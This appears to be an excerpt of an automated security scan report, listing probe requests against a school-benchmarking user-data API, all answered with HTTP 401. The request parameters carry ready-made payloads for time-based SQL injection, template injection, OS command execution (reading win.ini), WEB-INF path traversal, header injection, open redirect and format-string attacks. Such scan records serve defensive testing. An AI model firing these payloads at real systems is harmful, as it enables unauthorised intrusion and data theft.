* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%257B%257B6174*7330%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%257B%257B80020%257Cadd%253A28710%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%257B%257Bprint+%25225750%2522+%25227403%2522%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%257B4635*3814%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj+5229*3141+zj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+%252F+sleep%252815%2529+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+and+0+in+%2528select+sleep%252815%2529+%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+AND+1%253D1+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+AND+1%253D2+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+or+0+in+%2528select+sleep%252815%2529+%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+OR+1%253D1+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+UNION+ALL+select+NULL+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending+where+0+in+%2528select+sleep%252815%2529+%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending0W45pz4p&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=response.write%2528550%252C627*209%252C991%2529&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=Set-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=thishouldnotexistandhopefullyitwillnot&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=type+%2525SYSTEMROOT%2525%255Cwin.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=URL%253D%2527http%253A%252F%252F1498374535918995670.owasp.org%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=user-data&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=WEB-INF%252Fweb.xml&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=WEB-INF%255Cweb.xml&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=www.google.com%252F&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=www.google.com%252Fsearch%253Fq%253DZAP&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=www.google.com%253A80%252F&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=www.google.com%253A80%252Fsearch%253Fq%253DZAP&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=www.google.com&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=ZAP&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zApPX74sS&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%2523%257B2511*5892%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%2523set%2528%2524x%253D8147*2406%2529%2524%257Bx%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%2524%257B3324*4795%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%253C%2525%253D6345*9537%2525%253Ezj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%253Cp+th%253Atext%253D%2522%2524%257B3621*4680%257D%2522%253E%253C%252Fp%253Ezj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%257B%25239893*2067%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%257B%25408983*4111%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%257B%2540math+key%253D%25227049%2522+method%253D%2522multiply%2522+operand%253D%25223863%2522%252F%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%257B%257B%253D3327*1130%257D%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%257B%257B37210%257Cadd%253A58290%257D%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%257B%257B4752*9136%257D%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%257B%257Bprint+%25222119%2522+%25224368%2522%257D%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj%257B2859*1873%257Dzj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=zj+6270*4278+zj&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+%252F+sleep%252815%2529+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+and+0+in+%2528select+sleep%252815%2529+%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+AND+1%253D1+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+AND+1%253D2+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+or+0+in+%2528select+sleep%252815%2529+%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+OR+1%253D1+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+UNION+ALL+select+NULL+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId+where+0+in+%2528select+sleep%252815%2529+%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId0W45pz4p&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=response.write%2528798%252C383*389%252C752%2529&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=Set-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=thishouldnotexistandhopefullyitwillnot&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=type+%2525SYSTEMROOT%2525%255Cwin.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=URL%253D%2527http%253A%252F%252F1498374535918995670.owasp.org%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=user-data&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=WEB-INF%252Fweb.xml&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=WEB-INF%255Cweb.xml&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=www.google.com%252F&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=www.google.com%252Fsearch%253Fq%253DZAP&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=www.google.com%253A80%252F&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=www.google.com%253A80%252Fsearch%253Fq%253DZAP&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=www.google.com&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=xMjndCOpcGrVThOYPFMIBKyZMZUossGVRIQNYNPrIUjXLMGrPCtptRBJqLYALSFxonutTjWrEcyYxvsJrhrhbApqvjGdwVBoUtfMqjiCUcuetCfDRBucuxSGSQWrdJAPLDgtjPTXZSAJoDRknvdTWmgTHtDBjgDbcGomSDldUaDMFsfAFeuujhttfrXOMvZHheYBrrwZEBrfJxlgnkhvxAjCvoMuikwnXpJlrlIIyCrrsxNnTXLEuXXbBJnqHdAKtphUQNhnxaNHggPgonAXXttIawDMpWxHokQieDLnliIlWWmWMajpHDdaKqrmsMuTZycFlBdegPuNWgjdkrskBcZwIxwfojRpHEYqyTHmqijytdpeWhFVQGDSKnXrIJhbtrOXBuKNILiWmuSJrHYvanNRAymQplaachuChXNJjFtgvCreMPJajPQOJURsScXsCUKCyZYyNdnXYbSHkAkqtYenlZdxgjhxeOLZtAdmJpNHytDXugllrcuNPEuaSAlhXSGyjygxCoZcYDKxwEbIGaBxjwOkpFPYbEElohrrqTWouYtvCKRTsiZtGuhPFVrwKVRmcdfXccEOoPPMhOMEWCmQsJklFNDJabYXaayBGJZriSjvSAeiCClTBFsVcIXvXhABNXFPZSiSpmiAihbQnCVsnnBAlDJSsRvPKYsleXytBKTceSBbFMWYmJgwEQsaLDCcoHCRCTUdVaIGjHEmxoDlCJtRStaaDJZHZvrHNZugDoxERYuwTZuvuIhwXlHmAdOvpbUtJrGtDHGUqemZGIiBPjRfTheQZrxDoDVFNvj